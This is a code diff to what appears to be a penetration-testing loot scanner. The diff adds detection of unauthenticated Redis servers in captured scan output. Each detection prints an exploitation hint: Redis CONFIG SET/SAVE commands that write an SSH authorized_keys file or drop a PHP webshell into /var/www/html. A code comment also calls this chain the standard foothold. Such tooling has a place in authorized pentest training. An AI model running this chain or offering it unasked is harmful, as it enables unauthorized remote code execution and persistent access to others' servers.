@@ -1568,6 +1568,23 @@ _RADIUS_CLIENT = re.compile(
     r'\bsecret\s*=\s*[\'"]?([^\'"\s#\r\n]{3,80})[\'"]?'
 )
 
+# iter-210: Redis 6379 UNAUTH banner - `redis_version:` in captured output
+# indicates INFO command returned without an auth challenge, confirming
+# the target Redis accepts unauth commands. The canonical OSCP+ redis
+# foothold: unauth INFO → CONFIG SET dir + dbfilename → SET ssh key →
+# SAVE → ssh redis@<host> (or drop a webshell into /var/www/html/).
+# Also matches redis-cli prompt `<host>:<port>>` which only appears after
+# a successful connect - even without INFO, having the prompt confirms
+# unauth or at-least ACL-list-accessible.
+_REDIS_UNAUTH_INFO = re.compile(
+    r'(?im)^\s*redis_version\s*:\s*(\d+\.\d+(?:\.\d+)?)'
+)
+# `<host_or_ip>:<port>>` interactive prompt. Bounded host chars to
+# reduce FP on generic `x:y>` shapes.
+_REDIS_CLI_PROMPT = re.compile(
+    r'(?m)^([\w\-.]{1,60}):(\d{2,5})>\s'
+)
+
 # Mimikatz sekurlsa::logonpasswords NTLM block. We bound the wildcard distance
 # tightly to avoid catastrophic backtracking on big files; the real block has
 # Username/Domain/NTLM within ~300 bytes of each other.
@@ -2795,6 +2812,85 @@ def _multiline_passes(path, report, store):
             if store is not None:
                 store.add(Evidence(kind="plaintext", plaintext=secret,
                                    host=cname, source=path, line=_ln(m)))
+
+    # iter-210: Redis 6379 UNAUTH scan/loot output. Requires TWO signals
+    # for HIGH confidence:
+    #   (a) `redis_version:` line (INFO output) OR `<host>:<port>>` prompt
+    #   (b) NOT a redis.conf (would have `# Redis version` prose header)
+    #   (c) NOT a compose/dockerfile (image tag lines)
+    #   (d) `NOAUTH Authentication required` NOT nearby (indicates auth on)
+    # These constraints keep this specific to captured scan output where
+    # the operator has confirmed no-auth access.
+    _plow_rd = _plow_pfx
+    _base_rd = _base_pfx
+    _redis_gate_skip = (
+        _base_rd in ("redis.conf", "docker-compose.yml", "docker-compose.yaml",
+                      "compose.yaml", "compose.yml", "dockerfile")
+        or _plow_rd.endswith((".dockerfile", ".containerfile"))
+        or "/redis/redis.conf" in _plow_rd)
+    if not _redis_gate_skip and not filters.is_doc_file(path):
+        # Skip on any file where NOAUTH is prominent - Redis is auth'd there.
+        _noauth_ct = text[:16384].count("NOAUTH")
+        # We accept up to 1 NOAUTH mention (documentation might reference it)
+        # but 2+ suggests active auth challenges in the log.
+        if _noauth_ct <= 1:
+            # Signal (a): redis_version line = INFO response.
+            for m in _REDIS_UNAUTH_INFO.finditer(text):
+                # Anchor context - check the surrounding 200 chars don't
+                # look like a redis.conf header comment.
+                _s = max(0, m.start() - 100)
+                _e = min(len(text), m.end() + 100)
+                _ctx = text[_s:_e]
+                if "# Redis version" in _ctx or "# redis_version" in _ctx:
+                    continue
+                ver = m.group(1)
+                # Try to infer host from the file - look for the prompt in
+                # the same doc.
+                _hp_m = _REDIS_CLI_PROMPT.search(text[:16384])
+                if _hp_m:
+                    _host, _port = _hp_m.group(1), _hp_m.group(2)
+                    _target = f"{_host}:{_port}"
+                else:
+                    _target = "<redis-host>:6379"
+                report.add("HIGH", "SECRET-SIDECHANNEL", path, _ln(m),
+                           f"Redis {ver} UNAUTH access confirmed via INFO "
+                           f"({_target})",
+                           hint=(f"redis-cli -h {_target.split(':')[0]} "
+                                 f"-p {_target.split(':')[1] if ':' in _target else '6379'}"
+                                 f"  |  SSH key drop: "
+                                 f"CONFIG SET dir /home/redis/.ssh/; "
+                                 f"CONFIG SET dbfilename authorized_keys; "
+                                 f"SET x \"\\n\\nssh-rsa AAAA...\\n\\n\"; "
+                                 f"SAVE  |  webshell: "
+                                 f"CONFIG SET dir /var/www/html/; "
+                                 f"CONFIG SET dbfilename shell.php; "
+                                 f"SET x '<?php system($_GET[c]);?>'; SAVE"))
+                # One is enough - a scan output only needs one detection.
+                break
+
+            # Signal (b): redis-cli prompt directly = interactive foothold
+            # confirmed. Emit only when we DIDN'T already emit from INFO.
+            if not any("Redis" in f['detail'] and "UNAUTH" in f['detail']
+                       for f in report.findings[-5:]):
+                _pm = _REDIS_CLI_PROMPT.search(text)
+                if _pm:
+                    # Check what's after the prompt - a real interactive
+                    # session has commands like INFO, PING, CONFIG, SET.
+                    _after = text[_pm.end():_pm.end() + 1000]
+                    if re.search(r'\b(?:INFO|PING|CONFIG|KEYS|SET|GET|'
+                                  r'FLUSHALL|SAVE|CLIENT|ACL)\b', _after):
+                        _host_p, _port_p = _pm.group(1), _pm.group(2)
+                        # Ignore obviously-fake hosts.
+                        if not (_host_p in ("localhost", "127.0.0.1")
+                                and _port_p == "22"):
+                            report.add("HIGH", "SECRET-SIDECHANNEL", path,
+                                       _ln(_pm),
+                                       f"Redis interactive session on "
+                                       f"{_host_p}:{_port_p} (unauth "
+                                       f"connect - captured redis-cli)",
+                                       hint=(f"redis-cli -h {_host_p} -p "
+                                             f"{_port_p}  |  see INFO "
+                                             f"hint above for RCE chain"))
 
     # Mimikatz NTLM block (logonpasswords)
     for m in _MK_NTLM.finditer(text):
